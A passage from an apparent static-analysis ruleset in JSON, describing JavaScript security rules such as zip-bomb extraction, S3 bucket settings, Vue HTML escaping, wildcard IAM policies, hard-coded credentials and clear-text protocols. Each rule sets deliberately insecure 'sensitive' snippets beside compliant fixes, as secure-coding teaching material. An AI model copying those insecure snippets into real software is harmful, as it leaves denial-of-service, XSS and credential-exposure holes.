href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/345\">CWE-345 - Insufficient Verification of Data Authenticity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S5042": {
        "name": "Expanding archive files without controlling resource consumption is security-sensitive",
        "htmlDesc": "<p>Successful Zip Bomb attacks occur when an application expands untrusted archive files without controlling the size of the expanded data, which can\nlead to denial of service. A Zip bomb is usually a malicious archive file of a few kilobytes of compressed data but turned into gigabytes of\nuncompressed data. To achieve this extreme <a href=\"https://en.wikipedia.org/wiki/Data_compression_ratio\">compression ratio</a>, attackers will\ncompress irrelevant data (eg: a long string of repeated bytes).</p>\n<h2>Ask Yourself Whether</h2>\n<p>Archives to expand are untrusted and:</p>\n<ul>\n  <li> There is no validation of the number of entries in the archive. </li>\n  <li> There is no validation of the total size of the uncompressed data. </li>\n  <li> There is no validation of the ratio between the compressed and uncompressed archive entry. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Define and control the ratio between compressed and uncompressed data, in general the data compression ratio for most of the legit archives is\n  1 to 3. </li>\n  <li> Define and control the threshold for maximum total size of the uncompressed data. </li>\n  <li> Count the number of file entries extracted from the archive and abort the extraction if their number is greater than a predefined threshold, in\n  particular it’s not recommended to recursively expand archives (an entry of an archive could be also an archive). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>For <a href=\"https://github.com/npm/node-tar\">tar</a> module:</p>\n<pre>\nconst tar = require('tar');\n\ntar.x({ // Sensitive\n  file: 'foo.tar.gz'\n});\n</pre>\n<p>For <a href=\"https://github.com/cthackers/adm-zip\">adm-zip</a> module:</p>\n<pre>\nconst AdmZip = require('adm-zip');\n\nlet zip = new AdmZip(\"./foo.zip\");\nzip.extractAllTo(\".\"); // Sensitive\n</pre>\n<p>For <a href=\"https://stuk.github.io/jszip/\">jszip</a> module:</p>\n<pre>\nconst fs = require(\"fs\");\nconst JSZip = require(\"jszip\");\n\nfs.readFile(\"foo.zip\", function(err, data) {\n  if (err) throw err;\n  JSZip.loadAsync(data).then(function (zip) { // Sensitive\n    zip.forEach(function (relativePath, zipEntry) {\n      if (!zip.file(zipEntry.name)) {\n        fs.mkdirSync(zipEntry.name);\n      } else {\n        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {\n          fs.writeFileSync(zipEntry.name, content);\n        });\n      }\n    });\n  });\n});\n</pre>\n<p>For <a href=\"https://github.com/thejoshwolfe/yauzl\">yauzl</a> module</p>\n<pre>\nconst yauzl = require('yauzl');\n\nyauzl.open('foo.zip', function (err, zipfile) {\n  if (err) throw err;\n\n  zipfile.on(\"entry\", function(entry) {\n    zipfile.openReadStream(entry, function(err, readStream) {\n      if (err) throw err;\n      // TODO: extract\n    });\n  });\n});\n</pre>\n<p>For <a href=\"https://github.com/maxogden/extract-zip\">extract-zip</a> module:</p>\n<pre>\nconst extract = require('extract-zip')\n\nasync function main() {\n  let target = __dirname + '/test';\n  await extract('test.zip', { dir: target }); // Sensitive\n}\nmain();\n</pre>\n<h2>Compliant Solution</h2>\n<p>For <a href=\"https://github.com/npm/node-tar\">tar</a> module:</p>\n<pre>\nconst tar = require('tar');\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\n\nlet fileCount = 0;\nlet totalSize = 0;\n\ntar.x({\n  file: 'foo.tar.gz',\n  filter: (path, entry) =&gt; {\n    fileCount++;\n    if (fileCount &gt; MAX_FILES) {\n      throw 'Reached max. number of files';\n    }\n\n    totalSize += entry.size;\n    if (totalSize &gt; MAX_SIZE) {\n      throw 'Reached max. size';\n    }\n\n    return true;\n  }\n});\n</pre>\n<p>For <a href=\"https://github.com/cthackers/adm-zip\">adm-zip</a> module:</p>\n<pre>\nconst AdmZip = require('adm-zip');\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\nconst THRESHOLD_RATIO = 10;\n\nlet fileCount = 0;\nlet totalSize = 0;\nlet zip = new AdmZip(\"./foo.zip\");\nlet zipEntries = zip.getEntries();\nzipEntries.forEach(function(zipEntry) {\n    fileCount++;\n    if (fileCount &gt; MAX_FILES) {\n        throw 'Reached max. number of files';\n    }\n\n    let entrySize = zipEntry.getData().length;\n    totalSize += entrySize;\n    if (totalSize &gt; MAX_SIZE) {\n        throw 'Reached max. size';\n    }\n\n    let compressionRatio = entrySize / zipEntry.header.compressedSize;\n    if (compressionRatio &gt; THRESHOLD_RATIO) {\n        throw 'Reached max. compression ratio';\n    }\n\n    if (!zipEntry.isDirectory) {\n        zip.extractEntryTo(zipEntry.entryName, \".\");\n    }\n});\n</pre>\n<p>For <a href=\"https://stuk.github.io/jszip/\">jszip</a> module:</p>\n<pre>\nconst fs = require(\"fs\");\nconst pathmodule = require(\"path\");\nconst JSZip = require(\"jszip\");\n\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\n\nlet fileCount = 0;\nlet totalSize = 0;\nlet targetDirectory = __dirname + '/archive_tmp';\n\nfs.readFile(\"foo.zip\", function(err, data) {\n  if (err) throw err;\n  JSZip.loadAsync(data).then(function (zip) {\n    zip.forEach(function (relativePath, zipEntry) {\n      fileCount++;\n      if (fileCount &gt; MAX_FILES) {\n        throw 'Reached max. number of files';\n      }\n\n      // Prevent ZipSlip path traversal (S6096)\n      const resolvedPath = pathmodule.join(targetDirectory, zipEntry.name);\n      if (!resolvedPath.startsWith(targetDirectory)) {\n        throw 'Path traversal detected';\n      }\n\n      if (!zip.file(zipEntry.name)) {\n        fs.mkdirSync(resolvedPath);\n      } else {\n        zip.file(zipEntry.name).async('nodebuffer').then(function (content) {\n          totalSize += content.length;\n          if (totalSize &gt; MAX_SIZE) {\n            throw 'Reached max. size';\n          }\n\n          fs.writeFileSync(resolvedPath, content);\n        });\n      }\n    });\n  });\n});\n</pre>\n<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to\ndecide if the implementation is secure.</p>\n<p>For <a href=\"https://github.com/thejoshwolfe/yauzl\">yauzl</a> module</p>\n<pre>\nconst yauzl = require('yauzl');\n\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\nconst THRESHOLD_RATIO = 10;\n\nyauzl.open('foo.zip', function (err, zipfile) {\n  if (err) throw err;\n\n  let fileCount = 0;\n  let totalSize = 0;\n\n  zipfile.on(\"entry\", function(entry) {\n    fileCount++;\n    if (fileCount &gt; MAX_FILES) {\n      throw 'Reached max. number of files';\n    }\n\n    // The uncompressedSize comes from the zip headers, so it might not be trustworthy.\n    // Alternatively, calculate the size from the readStream.\n    let entrySize = entry.uncompressedSize;\n    totalSize += entrySize;\n    if (totalSize &gt; MAX_SIZE) {\n      throw 'Reached max. size';\n    }\n\n    if (entry.compressedSize &gt; 0) {\n      let compressionRatio = entrySize / entry.compressedSize;\n      if (compressionRatio &gt; THRESHOLD_RATIO) {\n        throw 'Reached max. compression ratio';\n      }\n    }\n\n    zipfile.openReadStream(entry, function(err, readStream) {\n      if (err) throw err;\n      // TODO: extract\n    });\n  });\n});\n</pre>\n<p>Be aware that due to the similar structure of sensitive and compliant code the issue will be raised in both cases. It is up to the developer to\ndecide if the implementation is secure.</p>\n<p>For <a href=\"https://github.com/maxogden/extract-zip\">extract-zip</a> module:</p>\n<pre>\nconst extract = require('extract-zip')\n\nconst MAX_FILES = 10000;\nconst MAX_SIZE = 1000000000; // 1 GB\nconst THRESHOLD_RATIO = 10;\n\nasync function main() {\n  let fileCount = 0;\n  let totalSize = 0;\n\n  let target = __dirname + '/foo';\n  await extract('foo.zip', {\n    dir: target,\n    onEntry: function(entry, zipfile) {\n      fileCount++;\n      if (fileCount &gt; MAX_FILES) {\n        throw 'Reached max. number of files';\n      }\n\n      // The uncompressedSize comes from the zip headers, so it might not be trustworthy.\n      // Alternatively, calculate the size from the readStream.\n      let entrySize = entry.uncompressedSize;\n      totalSize += entrySize;\n      if (totalSize &gt; MAX_SIZE) {\n        throw 'Reached max. size';\n      }\n\n      if (entry.compressedSize &gt; 0) {\n        let compressionRatio = entrySize / entry.compressedSize;\n        if (compressionRatio &gt; THRESHOLD_RATIO) {\n          throw 'Reached max. compression ratio';\n        }\n      }\n    }\n  });\n}\nmain();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/409\">CWE-409 - Improper Handling of Highly Compressed Data (Data Amplification)</a> </li>\n  <li> <a href=\"https://www.bamsoftware.com/hacks/zipbomb/\">bamsoftware.com</a> - A better Zip Bomb </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S6252": {
        "name": "Disabling versioning of S3 buckets is security-sensitive",
        "htmlDesc": "<p>S3 buckets can be versioned. When the S3 bucket is unversioned it means that a new version of an object overwrites an existing one in the S3\nbucket.</p>\n<p>It can lead to unintentional or intentional information loss.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The bucket stores information that require high availability. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to enable S3 versioning and thus to have the possibility to retrieve and restore different versions of an object.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    versioned: false // Sensitive\n});\n</pre>\n<p>The default value of <code>versioned</code> is <code>false</code> so the absence of this parameter is also sensitive.</p>\n<h2>Compliant Solution</h2>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    versioned: true\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/Versioning.html\">AWS documentation</a> - Using versioning in S3 buckets </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.Bucket.html#versioned\">AWS CDK version 2</a> - Using versioning in S3\n  buckets </li>\n</ul>",
        "severity": "MINOR"
      },
      "javascript:S2817": {
        "name": "Web SQL databases should not be used",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<h2>Why is this an issue?</h2>\n<p>The Web SQL Database standard never saw the light of day. It was first formulated, then deprecated by the W3C and was only implemented in some\nbrowsers. (It is not supported in Firefox or IE.)</p>\n<p>Further, the use of a Web SQL Database poses security concerns, since you only need its name to access such a database.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nvar db = window.openDatabase(\"myDb\", \"1.0\", \"Personal secrets stored here\", 2*1024*1024);  // Noncompliant\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities\">Top 10 2017 Category A9 -\n  Using Components with Known Vulnerabilities</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S6281": {
        "name": "Allowing public ACLs or policies on a S3 bucket is security-sensitive",
        "htmlDesc": "<p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>\n<p>This access control can be relaxed with ACLs or policies.</p>\n<p>To prevent permissive policies or ACLs to be set on a S3 bucket the following booleans settings can be enabled:</p>\n<ul>\n  <li> <code>blockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>\n  <li> <code>ignorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>\n  <li> <code>blockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>\n  <li> <code>restrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket\n  owner account. </li>\n</ul>\n<p>The other attribute <code>BlockPublicAccess.BLOCK_ACLS</code> only turns on <code>blockPublicAcls</code> and <code>ignorePublicAcls</code>. The\npublic policies can still affect the S3 bucket.</p>\n<p>However, all of those options can be enabled by setting the <code>blockPublicAccess</code> property of the S3 bucket to\n<code>BlockPublicAccess.BLOCK_ALL</code>.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The S3 bucket stores sensitive data. </li>\n  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>\n  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>\n  <li> These settings are not already enforced to true at the account level. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to configure:</p>\n<ul>\n  <li> <code>blockPublicAcls</code> to <code>True</code> to block new attempts to set public ACLs. </li>\n  <li> <code>ignorePublicAcls</code> to <code>True</code> to block existing public ACLs. </li>\n  <li> <code>blockPublicPolicy</code> to <code>True</code> to block new attempts to set public policies. </li>\n  <li> <code>restrictPublicBuckets</code> to <code>True</code> to restrict existing public policies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>By default, when not set, the <code>blockPublicAccess</code> is fully deactivated (nothing is blocked):</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket'\n}); // Sensitive\n</pre>\n<p>This <code>block_public_access</code> allows public ACL to be set:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: new s3.BlockPublicAccess({\n        blockPublicAcls         : false, // Sensitive\n        blockPublicPolicy       : true,\n        ignorePublicAcls        : true,\n        restrictPublicBuckets   : true\n    })\n});\n</pre>\n<p>The attribute <code>BLOCK_ACLS</code> only blocks and ignores public ACLs:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ACLS // Sensitive\n});\n</pre>\n<h2>Compliant Solution</h2>\n<p>This <code>blockPublicAccess</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public policies:</p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: s3.BlockPublicAccess.BLOCK_ALL\n});\n</pre>\n<p>A similar configuration to the one above can be obtained by setting all parameters of the <code>blockPublicAccess</code></p>\n<pre>\nconst s3 = require('aws-cdk-lib/aws-s3');\n\nnew s3.Bucket(this, 'id', {\n    bucketName: 'bucket',\n    blockPublicAccess: new s3.BlockPublicAccess({\n        blockPublicAcls         : true,\n        blockPublicPolicy       : true,\n        ignorePublicAcls        : true,\n        restrictPublicBuckets   : true\n    })\n});\n</pre>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html\">AWS Documentation</a> - Blocking public\n  access to your Amazon S3 storage </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n  <li> <a href=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_s3.BlockPublicAccess.html\">AWS CDK version 2</a> - BlockPublicAccess </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javascript:S6299": {
        "name": "Disabling Vue.js built-in escaping is security-sensitive",
        "htmlDesc": "<p>Vue.js framework prevents XSS vulnerabilities by automatically escaping HTML contents with the use of native API browsers like\n<code>innerText</code> instead of <code>innerHtml</code>.</p>\n<p>It’s still possible to explicity use <code>innerHtml</code> and similar APIs to render HTML. Accidentally rendering malicious HTML data will\nintroduce an XSS vulnerability in the application and enable a wide range of serious attacks like accessing/modifying sensitive information or\nimpersonating other users.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The application needs to render HTML content which:</p>\n<ul>\n  <li> could be user-controlled and not previously sanitized. </li>\n  <li> is difficult to understand how it was constructed. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Avoid injecting HTML content with <code>v-html</code> directive unless the content can be considered 100% safe, instead try to rely as much as\n  possible on built-in auto-escaping Vue.js features. </li>\n  <li> Take care when using the <code>v-bind:href</code> directive to set URLs which can contain malicious Javascript\n  (<code>javascript:onClick(...)</code>). </li>\n  <li> Event directives like <code>:onmouseover</code> are also prone to Javascript injection and should not be used with unsafe values. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>When using Vue.js templates, the <code>v-html</code> directive enables HTML rendering without any sanitization:</p>\n<pre>\n&lt;div v-html=\"htmlContent\"&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;\n</pre>\n<p>When using a rendering function, the <code>innerHTML</code> attribute enables HTML rendering without any sanitization:</p>\n<pre>\nVue.component('element', {\n  render: function (createElement) {\n    return createElement(\n      'div',\n      {\n        domProps: {\n          innerHTML: this.htmlContent, // Noncompliant\n        }\n      }\n    );\n  },\n});\n</pre>\n<p>When using JSX, the <code>domPropsInnerHTML</code> attribute enables HTML rendering without any sanitization:</p>\n<pre>\n&lt;div domPropsInnerHTML={this.htmlContent}&gt;&lt;/div&gt; &lt;!-- Noncompliant --&gt;\n</pre>\n<h2>Compliant Solution</h2>\n<p>When using Vue.js templates, putting the content as a child node of the element is safe:</p>\n<pre>\n&lt;div&gt;{{ htmlContent }}&lt;/div&gt;\n</pre>\n<p>When using a rendering function, using the <code>innerText</code> attribute or putting the content as a child node of the element is safe:</p>\n<pre>\nVue.component('element', {\n  render: function (createElement) {\n    return createElement(\n      'div',\n      {\n        domProps: {\n          innerText: this.htmlContent,\n        }\n      },\n      this.htmlContent // Child node\n    );\n  },\n});\n</pre>\n<p>When using JSX, putting the content as a child node of the element is safe:</p>\n<pre>\n&lt;div&gt;{this.htmlContent}&lt;/div&gt;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)\">Top 10 2017 Category A7 - Cross-Site Scripting\n  (XSS)</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/79\">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site\n  Scripting')</a> </li>\n  <li> <a href=\"https://vuejs.org/v2/guide/security.html#Injecting-HTML\">Vue.js - Security - Injecting HTML</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S6304": {
        "name": "Policies granting access to all resources of an account are security-sensitive",
        "htmlDesc": "<p>A policy that allows identities to access all resources in an AWS account may violate <a\nhref=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a>. Suppose an identity has permission to access\nall resources even though it only requires access to some non-sensitive ones. In this case, unauthorized access and disclosure of sensitive\ninformation will occur.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The AWS account has more than one resource with different levels of sensitivity.</p>\n<p>A risk exists if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>It’s recommended to apply the least privilege principle, i.e., by only granting access to necessary resources. A good practice to achieve this is\nto organize or <a\nhref=\"https://aws.amazon.com/blogs/security/simplify-granting-access-to-your-aws-resources-by-using-tags-on-aws-iam-users-and-roles/\">tag</a>\nresources depending on the sensitivity level of data they store or process. Therefore, managing a secure access control is less prone to errors.</p>\n<h2>Sensitive Code Example</h2>\n<p>The wildcard <code>\"*\"</code> is specified as the resource for this <code>PolicyStatement</code>. This grants the update permission for all\npolicies of the account:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [\n        new iam.PolicyStatement({\n            effect: iam.Effect.ALLOW,\n            actions: [\"iam:CreatePolicyVersion\"],\n            resources: [\"*\"] // Sensitive\n        })\n    ]\n})\n</pre>\n<h2>Compliant Solution</h2>\n<p>Restrict the update permission to the appropriate subset of policies:</p>\n<pre>\nimport { aws_iam as iam } from 'aws-cdk-lib'\n\nnew iam.PolicyDocument({\n    statements: [\n        new iam.PolicyStatement({\n            effect: iam.Effect.ALLOW,\n            actions: [\"iam:CreatePolicyVersion\"],\n            resources: [\"arn:aws:iam:::policy/team1/*\"]\n        })\n    ]\n})\n</pre>\n<h2>Exceptions</h2>\n<ul>\n  <li> Should not be raised on key policies (when AWS KMS actions are used.) </li>\n  <li> Should not be raised on policies not using any resources (if and only if all actions in the policy never require resources.) </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> <a href=\"https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege\">AWS Documentation</a> - Grant least\n  privilege </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/284\">CWE-284 - Improper Access Control</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\nvar mysql = require('mysql');\n\nvar connection = mysql.createConnection(\n{\n  host:'localhost',\n  user: \"admin\",\n  database: \"project\",\n  password: \"mypassword\", // sensitive\n  multipleStatements: true\n});\n\nconnection.connect();\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nvar mysql = require('mysql');\n\nvar connection = mysql.createConnection({\n  host: process.env.MYSQL_URL,\n  user: process.env.MYSQL_USERNAME,\n  password: process.env.MYSQL_PASSWORD,\n  database: process.env.MYSQL_DATABASE\n});\nconnection.connect();\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javascript:S5332": {
        "name": "Using clear-text protocols is security-sensitive",
        "htmlDesc": "<p>Clear-text protocols such as <code>ftp</code>, <code>telnet</code>, or <code>http</code> lack encryption of transported data, as well as the\ncapability to build an authenticated connection. It means that an attacker able to sniff traffic from the network can read, modify, or corrupt the\ntransported content. These protocols are not secure as they expose applications to an extensive range of risks:</p>\n<ul>\n  <li> sensitive data exposure </li>\n  <li> traffic redirected to a malicious endpoint </li>\n  <li> malware-infected software update or installer </li>\n  <li> execution of client-side code </li>\n  <li> corruption of critical information </li>\n</ul>\n<p>Even in the context of isolated networks like offline environments or segmented cloud environments, the insider threat exists. Thus, attacks\ninvolving communications being sniffed or tampered with can still happen.</p>\n<p>For example, attackers could successfully compromise prior security layers by:</p>\n<ul>\n  <li> bypassing isolation mechanisms </li>\n  <li> compromising a component of the network </li>\n  <li> getting the credentials of an internal IAM account (either from a service account or an actual person) </li>\n</ul>\n<p>In such cases, encrypting communications would decrease the chances of attackers to successfully leak data or steal credentials from other network\ncomponents. By layering various security practices (segmentation and encryption, for example), the application will follow the\n<em>defense-in-depth</em> principle.</p>\n<p>Note that using the <code>http</code> protocol is being deprecated by <a\nhref=\"https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http\">major web browsers</a>.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-6169\">CVE-2019-6169</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-12327\">CVE-2019-12327</a> </li>\n  <li> <a href=\"https://nvd.nist.gov/vuln/detail/CVE-2019-11065\">CVE-2019-11065</a> </li>\n</ul>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Application data needs to be protected against falsifications or leaks when transiting over the network. </li>\n  <li> Application data transits over an untrusted network. </li>\n  <li> Compliance rules require the service to encrypt data in transit. </li>\n  <li> Your application renders web pages with a relaxed mixed content policy. </li>\n  <li> OS-level protections against clear-text traffic are deactivated. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Make application data transit over a secure, authenticated and encrypted protocol like TLS or SSH. Here are a few alternatives to the most\n  common clear-text protocols:\n    <ul>\n      <li> Use <code>ssh</code> as an alternative to <code>telnet</code>. </li>\n      <li> Use <code>sftp</code>, <code>scp</code>, or <code>ftps</code> instead of <code>ftp</code>. </li>\n      <li> Use <code>https</code> instead of <code>http</code>. </li>\n      <li> Use <code>SMTP</code> over <code>SSL/TLS</code> or <code>SMTP</code> with <code>STARTTLS</code> instead of clear-text SMTP. </li>\n    </ul>  </li>\n  <li> Enable encryption of cloud components communications whenever it is possible. </li>\n  <li> Configure your application to block mixed content when rendering web pages. </li>\n  <li> If available, enforce OS-level deactivation of all clear-text traffic. </li>\n</ul>\n<p>It is recommended to secure all transport channels, even on local networks, as it can take a single non-secure connection to compromise an entire\napplication or system.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nurl = \"http://example.com\"; // Sensitive\nurl = \"ftp://anonymous@example.com\"; // Sensitive\nurl = \"telnet://anonymous@example.com\"; // Sensitive\n</pre>\n<p>For <a href=\"https://nodemailer.com\">nodemailer</a>:</p>\n<pre>\nconst nodemailer = require(\"nodemailer\");\nlet transporter = nodemailer.createTransport({\n  secure: false, // Sensitive\n  requireTLS: false // Sensitive\n});\n</pre>\n<pre>\nconst nodemailer = require(\"nodemailer\");\nlet transporter = nodemailer.createTransport({}); // Sensitive\n</pre>\n<p>For <a href=\"https://github.com/mscdex/node-ftp\">ftp</a>:</p>\n<pre>\nvar Client = require('ftp');\nvar c = new Client();\nc.connect({\n  'secure': false // Sensitive\n});\n</pre>\n<p>For <a href=\"https://github.com/mkozjak/node-telnet-client\">telnet-client</a>:</p>\n<pre>\nconst Telnet = require('telnet-client'); // Sensitive\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationLoadBalancer.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationLoadBalancer</a>:</p>\n<pre>\nimport { ApplicationLoadBalancer } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nconst alb = new ApplicationLoadBalancer(this, 'ALB', {\n  vpc: vpc,\n  internetFacing: true\n});\n\nalb.addListener('listener-http-default', {\n  port: 8080,\n  open: true\n}); // Sensitive\n\nalb.addListener('listener-http-explicit', {\n  protocol: ApplicationProtocol.HTTP, // Sensitive\n  port: 8080,\n  open: true\n});\n</pre>\n<p>For <a\nhref=\"https://docs.aws.amazon.com/cdk/api/v2/docs/aws-cdk-lib.aws_elasticloadbalancingv2.ApplicationListener.html\">aws-cdk-lib.aws-elasticloadbalancingv2.ApplicationListener</a>:</p>\n<pre>\nimport { ApplicationListener } from 'aws-cdk-lib/aws-elasticloadbalancingv2';\n\nnew 